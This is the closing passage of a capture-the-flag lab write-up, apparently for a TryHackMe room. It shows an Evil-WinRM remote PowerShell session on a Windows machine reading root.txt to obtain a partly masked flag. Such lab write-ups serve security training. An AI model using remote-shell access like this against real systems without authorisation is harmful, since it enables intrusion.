-a----         6/7/2021   8:07 PM             22 root.txt


*Evil-WinRM* PS C:\PerfLogs\Admin> type root.txt
THM{Cr0cc*****************}

*Evil-WinRM* PS C:\PerfLogs\Admin> Done !!
```

We completed the room !!!

The END]